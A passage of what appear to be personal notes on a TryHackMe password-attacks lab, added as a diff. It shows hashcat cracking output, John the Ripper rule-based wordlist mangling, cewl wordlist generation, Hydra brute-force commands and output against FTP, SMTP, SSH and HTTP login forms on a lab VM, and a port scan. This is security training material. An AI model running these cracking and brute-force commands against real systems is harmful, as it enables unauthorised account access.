@@ -669,3 +669,674 @@ e48e13207341b6bffb7fb1622282247b:1337
                                                           
 Session..........: hashcat
 Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: e48e13207341b6bffb7fb1622282247b
+Time.Started.....: Sat Sep 10 13:49:59 2022 (0 secs)
+Time.Estimated...: Sat Sep 10 13:49:59 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?d?d?d?d [4]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2478.7 kH/s (0.46ms) @ Accel:256 Loops:10 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10000/10000 (100.00%)
+Rejected.........: 0/10000 (0.00%)
+Restore.Point....: 0/1000 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
+Candidate.Engine.: Device Generator
+Candidates.#1....: 1234 -> 6764
+Hardware.Mon.#1..: Util: 27%
+
+Started: Sat Sep 10 13:49:24 2022
+Stopped: Sat Sep 10 13:50:01 2022
+```
+*1337*
+### Offline Attacks - Rule-Based
+Rule-Based attacks
+Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy — for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on.
+For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:
+```text
+Rule-based attack
+
+           
+user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
+JumboSingle
+o1
+o2
+i1
+i2
+o1
+i1
+o2
+i2
+best64
+d3ad0ne
+dive
+InsidePro
+T0XlC
+rockyou-30000
+specific
+ShiftToggle
+Split
+Single
+Extra
+OldOffice
+Single-Extra
+Wordlist
+ShiftToggle
+Multiword
+best64
+Jumbo
+KoreLogic
+T9
+```
+```text
+
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules"
+[List.Rules:None]
+[List.Rules:Drop]
+[List.Rules:JumboSingle]
+[List.Rules:Single]
+.include [List.Rules:JumboSingle]
+[List.Rules:Extra]
+[List.Rules:Wordlist]
+[List.Rules:NT]
+[List.Rules:ShiftToggle]
+[List.Rules:Multiword]
+[List.Rules:PhrasePreprocess]
+[List.Rules:Phrase]
+[List.Rules:PhraseCaseOne]
+[List.Rules:PhraseWrap]
+[List.Rules:Split]
+[List.Rules:OldOffice]
+[List.Rules:o1]
+[List.Rules:o2]
+[List.Rules:o3]
+[List.Rules:o]
+.include [List.Rules:o1]
+.include [List.Rules:o2]
+[List.Rules:i1]
+[List.Rules:i2]
+[List.Rules:i3]
+[List.Rules:i]
+.include [List.Rules:i1]
+.include [List.Rules:i2]
+[List.Rules:oi]
+.include [List.Rules:o1]
+.include [List.Rules:i1]
+.include [List.Rules:o2]
+.include [List.Rules:i2]
+[List.Rules:T9]
+[List.Rules:best64]
+[List.Rules:d3ad0ne]
+[List.Rules:dive]
+[List.Rules:InsidePro]
+[List.Rules:T0XlC]
+[List.Rules:rockyou-30000]
+[List.Rules:specific]
+[List.Rules:hashcat]
+.include [List.Rules:best64]
+.include [List.Rules:d3ad0ne]
+.include [List.Rules:dive]
+.include [List.Rules:InsidePro]
+.include [List.Rules:T0XlC]
+.include [List.Rules:rockyou-30000]
+.include [List.Rules:specific]
+[List.Rules:passphrase-rule1]
+[List.Rules:passphrase-rule2]
+[List.Rules:Loopback]
+.include [List.Rules:ShiftToggle]
+.include [List.Rules:Split]
+[List.Rules:Single-Extra]
+.include [List.Rules:Single]
+.include [List.Rules:Extra]
+.include [List.Rules:OldOffice]
+[List.Rules:Jumbo]
+.include [List.Rules:Single-Extra]
+.include [List.Rules:Wordlist]
+.include [List.Rules:ShiftToggle]
+.include [List.Rules:Multiword]
+.include [List.Rules:best64]
+.include [List.Rules:UnicodeSubstitution]
+[List.Rules:All]
+.include [List.Rules:Jumbo]
+.include [List.Rules:KoreLogic]
+.include [List.Rules:T9]
+.include [List.Rules:hashcat]
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"."
+cut: you must specify a list of bytes, characters, or fields
+Try 'cut --help' for more information.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d "."
+cut: you must specify a list of bytes, characters, or fields
+Try 'cut --help' for more information.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3
+
+Rules:JumboSingle]
+
+Rules:o1]
+Rules:o2]
+
+Rules:i1]
+Rules:i2]
+
+Rules:o1]
+Rules:i1]
+Rules:o2]
+Rules:i2]
+
+Rules:best64]
+Rules:d3ad0ne]
+Rules:dive]
+Rules:InsidePro]
+Rules:T0XlC]
+Rules:rockyou-30000]
+Rules:specific]
+
+Rules:ShiftToggle]
+Rules:Split]
+
+Rules:Single]
+Rules:Extra]
+Rules:OldOffice]
+
+Rules:Single-Extra]
+Rules:Wordlist]
+Rules:ShiftToggle]
+Rules:Multiword]
+Rules:best64]
+Rules:UnicodeSubstitution]
+
+Rules:Jumbo]
+Rules:KoreLogic]
+Rules:T9]
+Rules:hashcat]
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"." -f2
+
+Rules:JumboSingle]
+
+Rules:o1]
+Rules:o2]
+
+Rules:i1]
+Rules:i2]
+
+Rules:o1]
+Rules:i1]
+Rules:o2]
+Rules:i2]
+
+Rules:best64]
+Rules:d3ad0ne]
+Rules:dive]
+Rules:InsidePro]
+Rules:T0XlC]
+Rules:rockyou-30000]
+Rules:specific]
+
+Rules:ShiftToggle]
+Rules:Split]
+
+Rules:Single]
+Rules:Extra]
+Rules:OldOffice]
+
+Rules:Single-Extra]
+Rules:Wordlist]
+Rules:ShiftToggle]
+Rules:Multiword]
+Rules:best64]
+Rules:UnicodeSubstitution]
+
+Rules:Jumbo]
+Rules:KoreLogic]
+Rules:T9]
+Rules:hashcat]
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"."-f2 
+cut: the delimiter must be a single character
+Try 'cut --help' for more information.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"." -f2
+
+Rules:JumboSingle]
+
+Rules:o1]
+Rules:o2]
+
+Rules:i1]
+Rules:i2]
+
+Rules:o1]
+Rules:i1]
+Rules:o2]
+Rules:i2]
+
+Rules:best64]
+Rules:d3ad0ne]
+Rules:dive]
+Rules:InsidePro]
+Rules:T0XlC]
+Rules:rockyou-30000]
+Rules:specific]
+
+Rules:ShiftToggle]
+Rules:Split]
+
+Rules:Single]
+Rules:Extra]
+Rules:OldOffice]
+
+Rules:Single-Extra]
+Rules:Wordlist]
+Rules:ShiftToggle]
+Rules:Multiword]
+Rules:best64]
+Rules:UnicodeSubstitution]
+
+Rules:Jumbo]
+Rules:KoreLogic]
+Rules:T9]
+Rules:hashcat]
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2           
+
+JumboSingle]
+
+o1]
+o2]
+
+i1]
+i2]
+
+o1]
+i1]
+o2]
+i2]
+
+best64]
+d3ad0ne]
+dive]
+InsidePro]
+T0XlC]
+rockyou-30000]
+specific]
+
+ShiftToggle]
+Split]
+
+Single]
+Extra]
+OldOffice]
+
+Single-Extra]
+Wordlist]
+ShiftToggle]
+Multiword]
+best64]
+UnicodeSubstitution]
+
+Jumbo]
+KoreLogic]
+T9]
+hashcat]
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2| cut -d"]" -f1
+
+JumboSingle
+
+o1
+o2
+
+i1
+i2
+
+o1
+i1
+o2
+i2
+
+best64
+d3ad0ne
+dive
+InsidePro
+T0XlC
+rockyou-30000
+specific
+
+ShiftToggle
+Split
+
+Single
+Extra
+OldOffice
+
+Single-Extra
+Wordlist
+ShiftToggle
+Multiword
+best64
+UnicodeSubstitution
+
+Jumbo
+KoreLogic
+T9
+hashcat
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2| cut -d"]" -f1 | awk NF
+JumboSingle
+o1
+o2
+i1
+i2
+o1
+i1
+o2
+i2
+best64
+d3ad0ne
+dive
+InsidePro
+T0XlC
+rockyou-30000
+specific
+ShiftToggle
+Split
+Single
+Extra
+OldOffice
+Single-Extra
+Wordlist
+ShiftToggle
+Multiword
+best64
+UnicodeSubstitution
+Jumbo
+KoreLogic
+T9
+hashcat
+```
+We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme, to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do!
+```text
+Rule-based attack
+
+           
+user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo
+76
+```
+```text
+──(kali㉿kali)-[/tmp]
+└─$ nano single-password-list.txt
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ cd /home/kali/Downloads
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+75p 0:00:00:00 100.00% (2022-09-10 14:03) 750.0p/s tckmet
+75
+```
+--wordlist= to specify the wordlist or dictionary file.
+--rules to specify which rule or rules to use.
+--stdout to print the output to the terminal.
+|wc -l  to count how many lines John produced.
+By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic. KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here. Now let's use this rule and check whether the Tryh@ckM3 is available in our list!
+```text
+user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Tryh@ckm3
+7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john --wordlist=/tmp/single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Tryh@ckm3
+Tryh@ckm3
+7089833p 0:00:00:05 100.00% (2022-09-10 14:11) 1259Kp/s tryhackme999999
+```
+The output from the previous command shows that our list has the complex version of tryhackme, which is Tryh@ckM3. Finally, we recommend checking out all the rules and finding one that works the best for you. Many rules apply combinations to an existing wordlist and expand the wordlist to increase the chance of finding a valid password!
+Custom Rules
+John the ripper has a lot to offer. For instance, we can build our own rule(s) and use it at run time while john is cracking the hash or use the rule to build a custom wordlist!
+Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:
+[symbols]word[0-9]
+We can add our rule to the end of john.conf:
+```text
+John Rules
+
+           
+user@machine$ sudo vi /etc/john/john.conf 
+[List.Rules:THM-Password-Attacks] 
+Az"[0-9]" ^[!@#$]
+```
+[List.Rules:THM-Password-Attacks]  specify the rule name THM-Password-Attacks.
+Az represents a single word from the original wordlist/dictionary using -p.
+"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.
+^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.
+Now let's create a file containing a single word password to see how we can expand our wordlist using this rule.
+```text
+user@machine$ echo "password" > /tmp/single.lst
+```
+We include the name of the rule we created in the John command using the --rules option. We also need to show the result in the terminal. We can do this by using --stdout as follows:
+```text
+John Rules
+
+           
+user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
+Using default input encoding: UTF-8 
+!password0 
+@password0 
+#password0 
+$password0
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout  
+Using default input encoding: UTF-8
+!password0
+@password0
+#password0
+$password0
+!password1
+@password1
+#password1
+$password1
+!password2
+@password2
+#password2
+$password2
+!password3
+@password3
+#password3
+$password3
+!password4
+@password4
+#password4
+$password4
+!password5
+@password5
+#password5
+$password5
+!password6
+@password6
+#password6
+$password6
+!password7
+@password7
+#password7
+$password7
+!password8
+@password8
+#password8
+$password8
+!password9
+@password9
+#password9
+$password9
+40p 0:00:00:00 100.00% (2022-09-10 14:30) 285.7p/s $password9
+```
+Now it's practice time to create your own rule.
+What would the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@?
+(Az"[0-9][0-9]" ^[**] = Example: @password80 )
+Az"[0-9][0-9]" ^[!@]
+### Deploy the VM
+Deploy the attached VM to apply the knowledge we discussed in this room. The attached VM has various online services to perform password attacks on. Custom wordlists are needed to find valid credentials.
+We recommend using https://clinic.thmredteam.com/ to create your custom wordlist.
+To generate your wordlist using cewl against the website:
+```John Rules
+user@machine$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/
+```
+Note that you will also need to generate a username wordlist as shown in Task 3: Password Profiling #1 for the online attack questions.
+Get your pentest weapons ready to attack 10.10.163.182.
+*No answer needed*
+### Online password attacks
+Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using hydra which is a common tool used in attacking logins for various network services.
+Hydra
+Hydra supports an extensive list of network services to attack. Using hydra, we'll brute-force network services such as web login pages, FTP, SMTP, and SSH in this section. Often, within hydra, each service has its own options and the syntax hydra expects takes getting used to. It's important to check the help options for more information and features.
+FTP
+In the following scenario, we will perform a brute-force attack against an FTP server. By checking the hydra help options, we know the syntax of attacking the FTP server is as follows:
+```text
+FTP
+
+           
+user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
+```
+-l ftp we are specifying a single username, use-L for a username wordlist
+-P Path specifying the full path of wordlist, you can specify a single password by using -p.
+ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.
+Remember that sometimes you don't need to brute-force and could first try default credentials. Try to attack the FTP server on the attached VM and answer the question below.
+SMTP
+Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.
+```text
+SMTP
+
+           
+user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
+[DATA] attacking smtp://10.10.x.x:25/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
+[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+SSH
+SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.
+```text
+SSH
+
+           
+user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
+ 
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+[DATA] attacking ssh://10.10.x.x:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
+[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
+[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
+[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+HTTP login pages
+In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:
+<url>:<form parameters>:<condition string>[:<optional>[:<optional>]
+As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.
+```text
+hydra
+
+           
+user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
+[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
+[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
+1 of 1 target successfully completed, 1 valid password found 
+Hydra (http://www.thc.org/thc-hydra) 
+finished at 2021-10-13 08:06:45
+```
+-l admin  we are specifying a single username, use-L for a username wordlist
+-P Path specifying the full path of wordlist, you can specify a single password by using -p.
+10.10.x.x the IP address or the fully qualified domain name (FDQN) of the target.
+http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.
+Next, we specify the URL, path, and conditions that are split using :
+login-get/index.php the path of the login page on the target webserver.
+username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.
+The following section is important to eliminate false positives by specifying the 'failed' condition with F=.
+And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.
+Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.
+S=logout.php the success condition to identify the valid credentials
+-f to stop the brute-forcing attacks after finding a valid username and password
+You can try it out on the attached VM by visiting http://10.10.163.182/login-get/index.php. Make sure to deploy the attached VM if you haven't already to answer the questions below.
+Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:
+Medusa
+Ncrack
+others!
+```text
+──(kali㉿kali)-[/tmp]
+└─$ rustscan -a 10.10.163.182 --ulimit 5000 -b 65535 -- -A 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.163.182:21
+Open 10.10.163.182:22
+Open 10.10.163.182:25
+Open 10.10.163.182:80
+Open 10.10.163.182:465
+Open 10.10.163.182:587
